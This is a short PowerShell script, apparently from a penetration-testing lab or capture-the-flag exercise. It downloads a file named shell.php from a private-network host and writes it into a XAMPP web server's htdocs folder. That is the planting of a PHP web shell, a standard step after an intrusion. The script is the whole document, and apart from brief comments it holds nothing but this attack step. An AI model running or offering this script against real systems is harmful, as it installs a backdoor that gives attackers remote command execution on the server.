# Specify the URL to download the file from
$url = "http://10.4.37.160/shell.php"

# Specify the local path to save the downloaded file
$localPath = "C:\xampp\htdocs\shell.php"

# Download the file and save it locally
Invoke-WebRequest -Uri $url -OutFile $localPath